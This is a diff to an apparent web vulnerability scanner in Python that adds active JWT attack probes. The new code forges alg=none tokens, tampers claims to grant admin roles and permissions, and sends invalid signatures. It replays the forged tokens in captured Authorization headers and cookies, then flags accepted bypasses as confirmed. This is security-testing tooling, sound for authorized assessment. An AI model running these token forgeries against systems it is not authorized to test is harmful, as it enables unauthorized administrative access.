@@ -404,7 +404,239 @@ class WebAnalyzer:
             if hint in url.lower() and url not in result.auth_surfaces:
                 result.auth_surfaces.append(url)
 
+    @staticmethod
+    def _b64url_json(obj: dict) -> str:
+        raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
+        return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
+
+    @classmethod
+    def _encode_jwt_parts(cls, header: dict, claims: dict, signature: str = "") -> str:
+        return f"{cls._b64url_json(header)}.{cls._b64url_json(claims)}.{signature}"
+
+    @staticmethod
+    def _mutate_jwt_claims(claims: dict) -> dict:
+        mutated = dict(claims)
+        # Common authorization claim spellings used by CTF/web applications.
+        updates = {
+            "role": "admin",
+            "roles": ["admin"],
+            "is_admin": True,
+            "admin": True,
+            "permissions": ["admin", "*"],
+        }
+        changed = False
+        for key, value in updates.items():
+            if key in mutated:
+                mutated[key] = value
+                changed = True
+        if not changed:
+            mutated["role"] = "admin"
+            mutated["is_admin"] = True
+        return mutated
+
+    @staticmethod
+    def _jwt_rejection(body: str, status: int) -> bool:
+        text = (body or "").lower()
+        if status in {401, 403}:
+            return True
+        markers = (
+            "invalid token", "invalid jwt", "jwt invalid", "token invalid",
+            "unauthorized", "forbidden", "authentication required", "signature invalid",
+            "invalid signature", "access denied", "not authenticated",
+        )
+        return any(marker in text for marker in markers)
+
+    @staticmethod
+    def _replace_jwt_in_request(rec, location: str, original_token: str, mutated_token: str):
+        headers = dict(getattr(rec, "request_headers", {}) or {})
+        url = str(getattr(rec, "url", "") or "")
+        body = str(getattr(rec, "request_body", "") or "")
+
+        if location == "Authorization":
+            auth_key = next((k for k in headers if str(k).lower() == "authorization"), None)
+            if auth_key:
+                headers[auth_key] = re.sub(
+                    r"(?i)^Bearer\s+" + re.escape(original_token) + r"$",
+                    "Bearer " + mutated_token,
+                    headers[auth_key],
+                )
+                return url, headers, body
+
+        if location.startswith("Cookie:"):
+            cookie_name = location.split(":", 1)[1]
+            cookie_key = next((k for k in headers if str(k).lower() == "cookie"), None)
+            if cookie_key:
+                parts = []
+                found = False
+                for part in headers[cookie_key].split(";"):
+                    raw = part.strip()
+                    if "=" not in raw:
+                        parts.append(raw)
+                        continue
+                    name, value = raw.split("=", 1)
+                    if name.strip() == cookie_name and value.strip() == original_token:
+                        parts.append(f"{name.strip()}={mutated_token}")
+                        found = True
+                    else:
+                        parts.append(raw)
+                if found:
+                    headers[cookie_key] = "; ".join(parts)
+                    return url, headers, body
+        return None
+
+    def _jwt_probe_token(self, token: str, action: str) -> str:
+        parts = token.split(".")
+        if len(parts) != 3:
+            return ""
+        try:
+            header_part, payload_part, signature = parts
+            header_raw = base64.urlsafe_b64decode(header_part + "=" * (-len(header_part) % 4))
+            payload_raw = base64.urlsafe_b64decode(payload_part + "=" * (-len(payload_part) % 4))
+            header = json.loads(header_raw.decode("utf-8"))
+            claims = json.loads(payload_raw.decode("utf-8"))
+            if not isinstance(header, dict) or not isinstance(claims, dict):
+                return ""
+
+            if action == "JWT-ALG-NONE":
+                header["alg"] = "none"
+                return self._encode_jwt_parts(header, claims, "")
+            if action == "JWT-ALG-NONE-CLAIM-TAMPER":
+                header["alg"] = "none"
+                return self._encode_jwt_parts(header, self._mutate_jwt_claims(claims), "")
+            if action == "JWT-CLAIM-TAMPER":
+                return self._encode_jwt_parts(header, self._mutate_jwt_claims(claims), signature)
+            if action == "JWT-SIGNATURE-INVALID":
+                bad_signature = (signature[:-1] + ("A" if signature[-1:] != "A" else "B")) if signature else "invalid"
+                return self._encode_jwt_parts(header, claims, bad_signature)
+        except Exception:
+            return ""
+        return ""
+
+    def _evidence_for_jwt(self, action: str, baseline_status: int, baseline_body: str,
+                          control_status: int, control_body: str, test_status: int, test_body: str) -> tuple[str, str]:
+        baseline_accepted = 200 <= baseline_status < 400 and not self._jwt_rejection(baseline_body, baseline_status)
+        control_rejected = self._jwt_rejection(control_body, control_status) or control_status >= 400
+        test_accepted = 200 <= test_status < 400 and not self._jwt_rejection(test_body, test_status)
+
+        if action == "JWT-SIGNATURE-INVALID":
+            if control_rejected and test_accepted:
+                return "CONFIRMED", "invalid JWT signature was accepted where the invalid-token control was rejected"
+            return "TESTED", "invalid-signature control did not establish signature-bypass acceptance"
+
+        if baseline_accepted and control_rejected and test_accepted:
+            if action == "JWT-ALG-NONE":
+                return "CONFIRMED", "alg=none token was accepted on an endpoint where the invalid-token control was rejected"
+            if action == "JWT-ALG-NONE-CLAIM-TAMPER":
+                return "CONFIRMED", "alg=none token with admin claim tampering was accepted after invalid-token rejection"
+            if action == "JWT-CLAIM-TAMPER":
+                return "CONFIRMED", "tampered JWT claims with the original signature were accepted"
+        return "TESTED", "JWT mutation did not establish an authorization/signature bypass"
+
+    def _probe_jwt(self, client: httpx.Client, result: AnalysisResult, log=None) -> int:
+        tasks = []
+        seen = set()
+        for rec in result.requests:
+            method = rec.method.upper()
+            if method not in {"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"}:
+                continue
+            headers = {str(k).lower(): str(v) for k, v in (rec.request_headers or {}).items()}
+            auth = headers.get("authorization", "")
+            token = self._jwt_token(auth)
+            location = "Authorization" if token else ""
+            if not token:
+                cookie_header = headers.get("cookie", "")
+                for part in cookie_header.split(";"):
+                    if "=" not in part:
+                        continue
+                    name, value = [x.strip() for x in part.split("=", 1)]
+                    candidate = self._jwt_token(value)
+                    if candidate:
+                        token = candidate
+                        location = f"Cookie:{name}"
+                        break
+            if not token:
+                continue
+            key = (method, rec.url, location, token)
+            if key not in seen:
+                seen.add(key)
+                tasks.append((rec, token, location))
+
+        total = len(tasks) * len(PAYLOADS.get("JWT Analysis", []))
+        if log and tasks:
+            log(f"JWT RUN: {total} active token probes planned from observed Authorization/Cookie JWTs")
+        completed = 0
+
+        for rec, original_token, location in tasks:
+            original_mut = self._replace_jwt_in_request(rec, location, original_token, original_token)
+            if not original_mut:
+                continue
+            _, base_headers, base_body = original_mut
+            try:
+                control_token = self._jwt_probe_token(original_token, "JWT-SIGNATURE-INVALID")
+                control_mut = self._replace_jwt_in_request(rec, location, original_token, control_token)
+                if not control_mut:
+                    continue
+                control_url, control_headers, control_body = control_mut
+                control_resp = client.request(rec.method, control_url, headers=control_headers,
+                                              content=control_body.encode("utf-8") if control_body else None,
+                                              follow_redirects=True)
+                control_status = control_resp.status_code
+                control_text = control_resp.text[:200000]
+            except Exception as exc:
+                if log:
+                    log(f"JWT CONTROL ERR {rec.method} {rec.url}: {exc}")
+                continue
+
+            for action in PAYLOADS.get("JWT Analysis", []):
+                mutated_token = self._jwt_probe_token(original_token, action)
+                mutation = self._replace_jwt_in_request(rec, location, original_token, mutated_token)
+                if not mutation:
+                    continue
+                probe_url, probe_headers, probe_body = mutation
+                run = PayloadRun(
+                    family="JWT Analysis",
+                    payload=action,
+                    url=probe_url,
+                    parameter=location,
+                    baseline_status=rec.status,
+                    baseline_size=rec.size,
+                    baseline_body=rec.response_body[:200000],
+                    baseline_request=self._request_text(rec.method, rec.url, rec.request_headers, rec.request_body),
+                    test_request=self._request_text(rec.method, probe_url, probe_headers, probe_body),
+                    method=rec.method,
+                    source_urls=source_urls_for("JWT Analysis"),
+                )
+                try:
+                    response = client.request(rec.method, probe_url, headers=probe_headers,
+                                              content=probe_body.encode("utf-8") if probe_body else None,
+                                              follow_redirects=True)
+                    run.status = response.status_code
+                    run.size = len(response.content)
+                    run.test_body = response.text[:200000]
+                    run.response_headers = dict(response.headers)
+                    run.diff_summary = self._diff_summary(
+                        run.baseline_status, run.status, run.baseline_size, run.size,
+                        run.baseline_body, run.test_body,
+                    )
+                    run.state, run.evidence = self._evidence_for_jwt(
+                        action, run.baseline_status, run.baseline_body,
+                        control_status, control_text,
+                        run.status, run.test_body,
+                    )
+                except Exception as exc:
+                    run.error = str(exc)[:300]
+                    run.state = "TESTED"
+                result.payload_runs.append(run)
+                completed += 1
+                if log:
+                    log(f"JWT PAYLOAD {completed}/{total} {location} {action} {run.state} {run.status}")
+        if log and tasks:
+            confirmed = sum(1 for x in result.payload_runs if x.family == "JWT Analysis" and x.state == "CONFIRMED")
+            log(f"JWT RUN COMPLETE: {completed}/{total} probes executed • {confirmed} confirmed by evidence")
+        return completed
+
     def _probe_payloads(self, client: httpx.Client, result: AnalysisResult, log=None):
+        self._probe_jwt(client, result, log=log)
         query_records = []
         for rec in result.requests:
             method = rec.method.upper()
@@ -432,7 +664,7 @@ class WebAnalyzer:
             families = []
             for family in applicable_families(parameter, ctype, body=rec.request_body):
                 meta = PAYLOAD_CATALOG.get(family, {})
-                if meta.get("passive_only"):
+                if meta.get("passive_only") or family == "JWT Analysis":
                     continue
                 allowed_methods = set(meta.get("methods", []))
                 if allowed_methods and rec.method.upper() not in allowed_methods:
@@ -448,7 +680,7 @@ class WebAnalyzer:
             families = []
             for family in applicable_families(parameter, ctype, body=rec.request_body):
                 meta = PAYLOAD_CATALOG.get(family, {})
-                if meta.get("passive_only"):
+                if meta.get("passive_only") or family == "JWT Analysis":
                     continue
                 allowed_methods = set(meta.get("methods", []))
                 if allowed_methods and rec.method.upper() not in allowed_methods:
